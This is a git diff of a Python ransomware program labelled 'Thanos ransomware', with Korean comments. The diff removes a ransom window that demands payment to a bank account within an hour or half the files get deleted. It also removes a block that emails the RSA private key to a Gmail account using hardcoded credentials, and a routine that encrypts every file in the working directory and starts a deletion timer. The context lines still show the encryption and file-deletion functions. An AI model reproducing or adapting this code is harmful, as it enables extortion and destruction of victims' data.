@@ -6,59 +6,12 @@ from Crypto import Random  #RSA 키 생성시 필요
 from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
 import glob
 import os
-import threading
-from time import sleep
-
-#gui 라이브러리
-import tkinter
-from ui import thanos
-from tkinter.ttk import Label
-from PIL import Image, ImageTk
 
 import binascii
-#나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
-import smtplib
-import uuid
-from email.mime.text import MIMEText
 
-iv = os.urandom(16)
 
-# 버튼클릭시 복호화될수 있게
-def key_submit():
-    pw = str(password.get())
-    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
-    label6.pack()
-    pwbutton.destroy()
-    label4.destroy()
-    password.destroy()
 
-# gui 창 객체입니다
-window = tkinter.Tk()
-window.title("ransomware")
-window.state('zoomed')  # maximize the window
-height = window.winfo_height()  # ...
-width = window.winfo_width()
-window.configure(background="black")
 
-label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="green", bg="black", font='Helvetica 14 bold')
-label1.pack()
-label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 절반 삭제된다.", fg="green", bg="black", font='Helvetica 18 bold')
-label2.pack()
-label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="green", bg="black", font='Helvetica 18 bold')
-label3.pack()
-
-label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
-label4.pack()
-password = tkinter.Entry(window)
-password.pack()
-
-pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
-pwbutton.pack()
-
-image = tkinter.PhotoImage(file="ui/face.png")
-
-label5 = tkinter.Label(window, image=image)
-label5.pack()
 
 def list_files(path, ext=None):
     filelist=[]
@@ -79,7 +32,6 @@ def startTimer():
     print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
     #threading.Timer(5,remove_files(os.getcwd())).start()
-
     sleep(5)
     remove_files(os.getcwd())
 
@@ -187,7 +139,6 @@ def enc(key, cipher, in_filename, out_filename=None):
         print(result.read())
 
     print("---END ENCRYPTION : AES")
-
 def dec( cipher, in_filename, out_filename):
     print("---START DECRYPTION : AES")
 
@@ -247,6 +198,7 @@ def dec( cipher, in_filename, out_filename):
 
     print("---END DECRYPTION : AES")
 
+
 if __name__ == "__main__":
 
     key = os.urandom(16)
@@ -258,40 +210,6 @@ if __name__ == "__main__":
     private_key = rsa_key.export_key()
     print("비밀키는 : ", private_key)
 
-    '''
-    #고유 식별자 번호
-    UUID = uuid.uuid4()
-
-    #smtp 로그인 후 비밀키 전송
-    smtp = smtplib.SMTP('smtp.gmail.com', 587)
-    smtp.ehlo()  # say Hello
-    smtp.starttls()  # TLS 사용시 필요
-    smtp.login('secureantdd@gmail.com', 'antdd1234')    #확인은 이 계정에서!
-
-    msg = MIMEText(str(UUID) + '/' + private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
-    msg['Subject'] = '테스트'
-    msg['To'] = 'secureantdd@gmail.com'
-    smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
-
-    smtp.quit()
-    '''
-
-    #timer 테스트
-    enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
-    # 나중에 전체 트래킹 하는 법 알아야함
-    print("enc_targetlist: \n", enc_targetlist)
-    for enc_target in enc_targetlist:
-        if enc_target.split('.')[-1] == 'antdd':
-            continue
-        enc(key, cipher, enc_target, out_filename=None)
-
-    # 타이머 시작 코드
-    th1 = threading.Thread(target=startTimer)
-    th1.start()
-
-    # gui 시작 코드
-    th2 = threading.Thread(window.mainloop())
-    th2.start()
 
 
     '''
